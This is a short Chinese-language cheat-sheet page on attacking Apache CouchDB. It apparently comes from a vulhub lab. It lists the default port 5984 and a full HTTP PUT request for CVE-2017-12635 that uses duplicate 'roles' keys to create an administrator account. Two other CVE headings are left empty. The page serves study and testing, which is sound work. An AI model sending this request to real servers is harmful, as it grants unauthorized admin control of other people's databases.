---
title: "Couchdb"
date: 2026-01-30
updated: 2026-01-30
tags:
  - Others
categories:
  - Others
description: None
---
默认端口：5984

## CVE-2017-12635

```url
http://xx.xx.xx.xx:5984/_utils/
```

![[attachments/20260130.png]]

```
PUT /_users/org.couchdb.user:vulhub HTTP/1.1
Host: your-ip:5984
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 108

{
  "type": "user",
  "name": "vulhub",
  "roles": ["_admin"],
  "roles": [],
  "password": "vulhub"
}
```

添加一个管理员用户

## CVE-2017-12636

...

## CVE-2022-24706

...